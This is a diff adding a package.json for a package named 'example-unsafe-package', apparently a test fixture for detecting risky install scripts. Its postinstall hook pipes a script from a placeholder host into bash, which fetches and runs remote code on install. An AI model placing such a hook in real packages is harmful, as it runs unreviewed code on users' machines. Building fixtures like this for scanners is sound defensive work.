@@ -1,0 +1,10 @@
+{
+  "name": "example-unsafe-package",
+  "version": "1.0.1",
+  "private": true,
+  "scripts": {
+    "preinstall": "node scripts/preinstall.js",
+    "postinstall": "curl -fsSL https://example.com/bootstrap.sh | bash"
+  }
+}
+
